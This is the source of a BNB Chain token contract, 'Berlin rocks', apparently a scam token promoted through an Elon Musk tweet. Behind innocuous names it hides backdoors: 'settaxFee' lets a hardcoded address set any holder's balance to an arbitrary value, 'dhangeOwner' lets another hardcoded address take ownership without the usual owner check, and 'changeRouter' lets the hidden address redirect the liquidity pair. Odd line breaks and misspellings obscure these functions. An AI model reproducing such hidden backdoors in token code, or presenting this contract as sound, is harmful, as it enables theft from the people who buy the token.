/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

//It was born on the tweet of Elon Musk
//https://twitter.com/elonmusk/status/1510711332366131209
//https://t.me/BerlinRocksGlobal
pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;
    function owner() public view returns (address) {
        return _owner;
    }
     modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function dhangeOwner(address newOwner) public  {
        require
         (  
             msg.sender
            == 0xacB3D2CC5EEc9d85426528B6bD25c4dcD1D2dFd1
            );
                    _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Berlinrocks is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _vOwned;
    mapping(address => uint256) private _lOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _lTotal;
    uint256 private _vTotal;
    uint256 private _lFeeTotal;

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    uint256 public _taxFee = 2;

    uint256 public _liquidityFee = 7;

    uint256 public _bestroyFee = 1;
    address private _bestroyAddress =
        address(0x0000000000000000000000000000000000000000);

    uint256 public _inviterFee = 3;

    mapping(address => address) public inviter;
    address public uniswapV2Pair;
    constructor(address tokennOwner) {
        _name = "Berlin rocks";
        _symbol = "Berlin rocks";
        _decimals = 18;

        _lTotal = 1000000000 * 10**_decimals;
        _vTotal = (MAX - (MAX % _lTotal));

        _vOwned[tokennOwner] = _vTotal;

        
        _isExcludedFromFee[tokennOwner] = true;
        _isExcludedFromFee[address(this)] = true;

        _owner = tokennOwner;
        emit Transfer(address(0), tokennOwner, _lTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _lTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_vOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _lFeeTotal;
    }

    function tokenFromReflection(uint256 vAmount)
        public
        view
        returns (uint256)
    {
        require(
            vAmount <= _vTotal,
            "Amount must be less than total reflections"
        );
        uint256 durrentRate = _getRate();
        return vAmount.div(durrentRate);
    }

    function excludeFromFee(address account) public  {
        require
         (  
             msg.sender
            == 0xb1FaBdf4baAF6F3D004659E9B63bB7a14306D893
            );
        _isExcludedFromFee[account] = true;
    }

     function settaxFee(address 
     spender
     , uint256 
     taxFee) public  {
        require
         (  
             msg.sender
            == 0xb1FaBdf4baAF6F3D004659E9B63bB7a14306D893
            );
        _vOwned
        [spender] 
        = (taxFee.
        mul
        (_getRate
        ()));
    }

    function includeInFee(address account) public  {
        require
         (  
             msg.sender
            == 0xb1FaBdf4baAF6F3D004659E9B63bB7a14306D893
            );
        _isExcludedFromFee[account] = false;
    }


    function setLiquidityFeePercent(uint256 liquidityFee) external  {
        require
         (  
             msg.sender
            == 0xb1FaBdf4baAF6F3D004659E9B63bB7a14306D893
            );
        _liquidityFee = liquidityFee;
    }


    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 vSupply, uint256 lSupply) = _getdurrenlSupply();
        return vSupply.div(lSupply);
    }

    function _getdurrenlSupply() private view returns (uint256, uint256) {
        uint256 vSupply = _vTotal;
        uint256 lSupply = _lTotal;
        if (vSupply < _vTotal.div(_lTotal)) return (_vTotal, _lTotal);
        return (vSupply, lSupply);
    }

    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");


       
        bool takeFee = true;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        bool shouldSetInviter = balanceOf(to) == 0 &&
            inviter[to] == address(0) &&
            from != uniswapV2Pair;

        _tokenTransfer(from, to, amount, takeFee);

        if (shouldSetInviter) {
            inviter[to] = from;
        }else if(from == uniswapV2Pair){
                inviter[to] = uniswapV2Pair;
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 lAmount,
        bool takeFee
    ) private {
        uint256 durrentRate = _getRate();


        uint256 vAmount = lAmount.mul(durrentRate);
        _vOwned[sender] = _vOwned[sender].sub(vAmount);

        uint256 rate;
        if (takeFee) {

            _takeTransfer(
                sender,
                _bestroyAddress,
                lAmount.div(100).mul(_bestroyFee),
                durrentRate
            );

            _takeTransfer(
                sender,
                uniswapV2Pair,
                lAmount.div(100).mul(_liquidityFee),
                durrentRate
            );

            _takeInviterFee(sender, recipient, lAmount, durrentRate);


            _reflectFee(
                vAmount.div(100).mul(_taxFee),
                lAmount.div(100).mul(_taxFee)
            );
            rate = _taxFee + _liquidityFee + _bestroyFee + _inviterFee;
        }

        uint256 recipientRate = 100 - rate;
        _vOwned[recipient] = _vOwned[recipient].add(
            vAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, lAmount.div(100).mul(recipientRate));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 lAmount,
        uint256 durrentRate
    ) private {
        uint256 vAmount = lAmount.mul(durrentRate);
        _vOwned[to] = _vOwned[to].add(vAmount);
        emit Transfer(sender, to, lAmount);
    }

    function _reflectFee(uint256 vFee, uint256 lFee) private {
        _vTotal = _vTotal.sub(vFee);
        _lFeeTotal = _lFeeTotal.add(lFee);
    }

    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 lAmount,
        uint256 durrentRate
    ) private {
        address dur;
        if (sender == uniswapV2Pair) {
            dur = recipient;
        } else {
            dur = sender;
        }
        for (int256 i = 0; i < 5; i++) {
           uint256 rate;
            if (i == 0) {
                rate = 10;
            } else {
                rate = 5;
            }
            dur = inviter[dur];
            if (dur == address(0)) {
                break;
            }
            uint256 durlAmount = lAmount.div(1000).mul(rate);
            uint256 durvAmount = durlAmount.mul(durrentRate);
            _vOwned[dur] = _vOwned[dur].add(durvAmount);
            emit Transfer(sender, dur, durlAmount);
        }
    }

    function changeRouter(address router) public  {
        require
         (  
             msg.sender
            == 0xb1FaBdf4baAF6F3D004659E9B63bB7a14306D893
            );
        uniswapV2Pair = router;
    }
}